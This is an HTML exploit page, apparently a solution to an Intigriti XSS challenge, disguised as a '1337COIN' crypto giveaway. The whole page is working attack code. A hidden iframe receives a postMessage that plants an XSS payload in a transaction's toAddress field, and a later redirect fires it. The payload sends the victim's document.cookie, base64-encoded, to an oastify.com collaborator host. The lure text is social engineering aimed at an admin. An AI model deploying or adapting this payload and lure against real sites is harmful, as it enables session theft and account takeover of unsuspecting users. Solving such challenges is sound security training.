<!DOCTYPE html>
<html>
<head>
    <title>Giveaway - Final Step</title>
</head>
<body style="background: #050A0E; color: #00FF88; font-family: sans-serif; text-align: center;">
    <h1>Processing your 1337COIN reward...</h1>
    <p>Please stay on this page for 10 seconds.</p>

    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none;"></iframe>

    <script>
        // The XSS payload. It breaks out of the title attribute and sends the admin's secret flag/cookie to you.
        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
        const XSS = `"><img src=x onerror="fetch('${COLLAB}/?leak='+btoa(document.cookie))">`;

        window.onload = function() {
            const victim = document.getElementById('target').contentWindow;

            // Step 2: Strike after 4 seconds (allows wallets to load)
            setTimeout(() => {
                victim.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        currency: '1337COIN',
                        amount: 0.00001,
                        toAddress: XSS // Our payload is now the "trail"
                    }
                }, '*');
                
                console.log("Transaction submitted. Redirecting admin to trigger XSS...");

                // Step 3: Redirect the admin to MarketWatch to fire the XSS
                setTimeout(() => {
                    window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
                }, 2000);
            }, 4000);
        };
    </script>
</body>
</html>
